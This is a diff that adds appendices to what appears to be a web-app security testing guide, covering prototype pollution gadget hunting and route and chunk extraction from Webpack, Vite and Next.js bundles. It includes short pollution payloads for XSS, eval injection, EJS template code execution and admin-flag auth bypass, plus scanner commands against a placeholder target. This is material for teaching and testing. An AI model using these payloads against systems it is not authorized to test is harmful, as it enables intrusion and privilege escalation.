@@ -861,3 +861,145 @@ Total Secrets: 12
 4. Extended Candidates (187 untested paths)
 5. Iteration Log (3 rounds of discovery)
 ```
+
+---
+
+## Appendix A: Prototype Pollution Gadget Hunting
+
+### What to Look For
+Prototype pollution occurs when attacker-controlled data is merged into an object hierarchy. In JS bundles, search for:
+
+**Pattern 1: Unsafe recursive merge**
+```javascript
+function merge(a, b) {
+    for (var key in b) {
+        if (isObject(a[key]) && isObject(b[key])) {
+            merge(a[key], b[key]);          // <-- POLLUTION VECTOR
+        } else {
+            a[key] = b[key];                // <-- POLLUTION VECTOR
+        }
+    }
+}
+```
+Search regex: `for\s*\(.*in.*\)\s*{[^}]*a\[.*=.*b\[`
+
+**Pattern 2: Unsafe Object.assign deep**
+```javascript
+$.extend(true, {}, JSON.parse(input));     // jQuery deep extend
+_.merge({}, JSON.parse(input));            // Lodash merge
+Object.assign(target, source);            // Shallow but can pollute if source has __proto__
+```
+
+**Pattern 3: URL Query String Parsing**
+```javascript
+function parseQuery(str) {
+    return str.split('&').reduce((o, p) => {
+        var [k, v] = p.split('=');
+        set(o, k, v);                      // <-- if set() allows __proto__ keys
+        return o;
+    }, {});
+}
+```
+
+### Gadget Discovery
+After confirming pollution is possible, hunt for gadgets that read from the prototype chain:
+
+**innerHTML Gadget:**
+```javascript
+// Look for: element.innerHTML = obj.someProperty
+// Pollution: {"__proto__": {"someProperty": "<img src=x onerror=alert(1)>"}}
+```
+
+**eval Gadget:**
+```javascript
+// Look for: eval(obj[key])
+// Pollution: {"__proto__": {"key": "alert(1)"}}
+```
+
+**Template Engine Gadgets (EJS/Handlebars/Pug):**
+```javascript
+// EJS: options.escapeFunction
+// Pollution: {"__proto__": {"escapeFunction": "exec"}}
+```
+
+**Auth Bypass Gadgets:**
+```javascript
+// Look for: if (user.admin)
+// Pollution: {"__proto__": {"admin": true}}
+```
+
+### Automated Tools
+- ppfuzz: `python3 ppfuzz.py -u "https://target.com/page?__proto__[test]=value"`
+- DOM Invader (Burp Suite) — prototype pollution tab
+- Nuclei templates: `nuclei -t ~/nuclei-templates/vulnerabilities/generic/prototype-pollution.yaml`
+
+---
+
+## Appendix B: Modern Bundler Analysis
+
+### Webpack 5 Module Federation
+```
+Pattern: __webpack_init_sharing__, __webpack_share_scopes__
+Look for: remoteEntry.js, federation.js, exposes:[]
+```
+Module Federation exposes remote containers that may be less hardened:
+- Find `remoteEntry.js` → extract all exposed modules
+- Each exposed module is an API surface
+
+### Vite/Rolldown Bundle Analysis
+```
+Pattern: import.meta.env, __vite__
+Vite bundles: index-[hash].js, chunk-[hash].js (not chunk-vendors.js)
+Lazy imports: import(/* @vite-ignore */ './Foo.vue')
+```
+- Vite uses native ESM for dev, Rollup for production
+- Chunk filenames are shorter hashes (not long webpack-style)
+- Search for `.env` file patterns (VITE_API_URL, VITE_API_KEY)
+
+### Turbopack (Next.js 15+)
+```
+Pattern: __turbopack__, __turbopack_external_import__
+Next.js bundles: _next/static/chunks/pages/*.js (Pages Router)
+                 _next/static/chunks/app/*.js (App Router)
+```
+- App Router bundles contain Server Components (may have backend logic)
+- API routes at `/api/*` may have different auth levels
+- Search for server action names (they're exported as strings)
+
+### Dynamic Import Extraction
+```bash
+# Find all lazy-loaded module references
+grep -oP 'import\(["'"'"'][^"'"'"']+["'"'"']\)' all-bundles.js | sort -u
+grep -oP '\.l\([0-9]+\)' all-bundles.js          # Webpack lazy
+grep -oP 'n\.e\([0-9]+\)' all-bundles.js          # Webpack ensure
+```
+
+### SPA Route Extraction
+```bash
+# React Router
+grep -oP 'path:\s*["'"'"']/[^"'"'"']+["'"'"']' all-bundles.js | sort -u
+
+# Vue Router
+grep -oP 'path["\'":]\s*["\'"']/[^"'"'"']+["'"'"']' all-bundles.js | sort -u
+
+# Angular Router
+grep -oP 'path["\'":]\s*["\'"']/[^"'"'"']+["'"'"']' all-bundles.js | sort -u
+
+# Next.js (inferred from file structure)
+find _next/static/chunks/pages/ -name "*.js" | sed 's/.*pages\///; s/\.js$//; s/index$//; s/\[\(.*\)\]/:\1/g'
+```
+
+### Lazy Chunk Downloading
+```bash
+# Extract all chunk URLs from vendor JS
+grep -oP '["'"'"']https?://[^"'"'"']+\.chunk\.js[^"'"'"']*["'"'"']' vendor.js | sort -u
+
+# Extract webpack chunk path prefixes
+grep -oP '\.p\s*\+\s*["'"'"'][^"'"'"']*\.js["'"'"']' vendor.js | head -5
+
+# Download ALL chunks
+for url in $(grep -oP 'https?://[^"'"'"']+\.js(\?[^"'"'"']*)?["'"'"']' all_bundles.js | tr -d '"' | sort -u); do
+    wget "$url" -P chunks/
+done
+```
+
